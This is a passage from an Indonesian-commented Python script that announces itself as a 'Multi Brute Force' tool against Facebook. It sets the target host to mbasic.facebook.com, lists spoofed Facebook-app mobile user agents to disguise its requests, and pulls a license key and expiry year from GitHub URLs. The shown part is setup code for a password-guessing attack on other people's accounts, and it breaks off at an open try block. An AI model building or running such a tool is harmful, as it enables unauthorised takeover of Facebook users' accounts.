...
def banner():
    print("""   _____            __\n  / __(_)_ _  ___  / /__ ®  ┌──────────────────────────────┐\n _\ \/ /  ^ \/ _ \/ / -_)   │  Script By Dapunta Khurayra  │\n/___/_/_/_/_/ .__/_/\__/    │   •• Github.com/Dapunta ••   │\n     Multi /_/ Brute Force  └──────────────────────────────┘""")

host="https://mbasic.facebook.com"
useragents = [
 ('Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 10; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]','Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]','Mozilla/5.0 (Linux; Android 10; Redmi 8A Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/110.0.0.14.69;]')]
...
### EXPIRED
# sistem license : tinggal ubah tahun untuk expired
# untuk expired isi dengan tahun depan 
# contoh skrg 2021 , nah isi 2022 untuk notice expired
durasi = str(datetime.now().strftime('%d-%m-%Y'))
license = requests.get('https://raw.githubusercontent.com/Dapunta2021/server/main/apikey.txt').text ## Ganti Dengan Github Lu
dev_dapunta = requests.get("https://raw.githubusercontent.com/Dapunta2021/sbf/main/durasi.php").text ## Ganti Dengan Github Lu
response = ("[!] Script Was Expired") #ini buat catatan
year_to_expire = int(dev_dapunta) ## jangan di ubah
try:
